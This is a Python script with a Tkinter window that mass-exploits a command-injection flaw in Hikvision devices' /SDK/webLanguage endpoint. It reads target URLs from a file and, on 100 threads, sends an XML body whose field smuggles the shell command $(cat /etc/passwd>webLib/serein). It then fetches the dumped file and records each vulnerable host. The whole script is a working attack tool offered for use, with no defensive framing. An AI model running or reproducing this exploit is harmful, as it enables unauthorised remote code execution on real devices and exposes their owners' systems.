from concurrent.futures import ThreadPoolExecutor
import requests
from tkinter import *
from PIL.ImageTk import PhotoImage
import tkinter as tk
from tkinter import scrolledtext
from ttkbootstrap.constants import *
def get_hkvurl():
    with open("corrected url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address

def hkv_rce(address):
    try:
        url1 = address + "/SDK/webLanguage"
        newurl = url1.split('//')[1].split('/')[0]
        if ":" not in str(newurl):
            pass
        else:
            host = newurl.split(':')[0]
            port = newurl.split(':')[1]
            headers = {
                "host": f'{host}:{port}',
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36",
                'Accept': '*/*',
                'X-Requested-With': 'XMLHttpRequest',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-US,en;q=0.9,sv;q=0.8'
            }
            data = r"""<?xml version="1.0" encoding="UTF-8"?><language>$(cat /etc/passwd>webLib/serein)</language>"""
            resp1 = requests.put(url1, headers=headers, data=data, timeout=3,verify=False)
            url2 = address + "/serein"
            resp2 = requests.get(url2,timeout=3,verify=False)
            if "root" in resp2.text:
                hkv_text.insert(END, chars="[O(∩_∩)O]Vulnerable and executable!Vulnerable url:" + url2 + "\n")
                hkv_text.see(END)
                with open("[exists]Hikvision_RCE_url.txt", "a+") as m:
                    m.write(url2 + "\n")
            else:
                hkv_text.insert(END, chars="[×]URL without vulnerability:" + url2 + "\n")
                hkv_text.see(END)
    except Exception as e:
        hkv_text.insert(END, chars="[×]The target request failed, and the error content:" + str(e) + "\n")
        hkv_text.see(END)

def hkv_rce_gui():
    hkv_gui = Toplevel()
    hkv_gui.geometry("1035x455")
    hkv_gui.title("Hikvision RCE [auto-muti-exp]")
    hkv_gui.resizable(0, 0)
    logo = PhotoImage(file="./logo.ico")
    hkv_gui.tk.call('wm', 'iconphoto', hkv_gui._w, logo)
    global hkv_text
    hkv_text = scrolledtext.ScrolledText(hkv_gui,width=119, height=24)
    hkv_text.grid(row=4, columnspan=3, padx=20, pady=10)
    hkv_text.see(END)
    max_thread_num = 100
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    addresses = get_hkvurl()
    for addr in addresses:
        future = executor.submit(hkv_rce,addr)
    hkv_gui.mainloop()